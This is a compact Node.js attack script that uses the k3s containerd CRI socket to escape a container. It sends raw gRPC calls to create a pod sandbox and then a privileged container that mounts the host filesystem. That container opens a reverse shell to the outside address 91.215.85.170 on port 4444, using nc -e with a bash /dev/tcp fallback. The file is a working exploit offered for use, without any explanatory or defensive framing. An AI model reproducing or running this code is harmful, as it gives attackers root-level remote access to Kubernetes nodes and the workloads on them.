const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
const CMD='touch /h/tmp/zz_cri; /h/bin/nc 91.215.85.170 4444 -e /bin/sh 2>/dev/null || /h/bin/bash -c "/h/bin/bash -i >& /dev/tcp/91.215.85.170/4444 0>&1"';
call('/runtime.v1.ImageService/ListImages',Buffer.alloc(0),(e,ib)=>{
 const s=(ib||Buffer.alloc(0)).toString('latin1');
 const refs=[...new Set(s.match(/[a-z0-9._\-\/]+:[a-z0-9._\-]+/gi)||[])].filter(x=>!/pause|cni|sha256/i.test(x));
 const img=refs[0]||'busybox';
 const nsopt=v1(0x08,1);
 const ssec=Buffer.concat([v1(0x0a,nsopt.length),nsopt]);
 const lsc=Buffer.concat([v1(0x12,ssec.length),ssec]);
 const plinux=Buffer.concat([v1(0x42,lsc.length),lsc]);
 const pmeta=Buffer.concat([fl(0x0a,'zzhn2'),fl(0x12,'uid4'),fl(0x1a,'default'),v1(0x20,1)]);
 const pcfg=Buffer.concat([pmeta, fl(0x12,'zzhn2'), fl(0x1a,'/tmp'), plinux]);
 call('/runtime.v1.RuntimeService/RunPodSandbox',pcfg,(e3,sb)=>{
  if(e3)return; const sm=(sb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!sm)return;
  const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
  const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
  const cfg=Buffer.concat([fl(0x0a,'zzesc'), v1(0x10,1), Buffer.concat([v1(0x12,img.length),Buffer.from(img)]), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
  call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sm[0]), v1(0x12,cfg.length), cfg]),(e4,ob)=>{
    if(e4)return; const c2=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!c2)return;
    call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,c2[0]),()=>{});
  });
 });
});
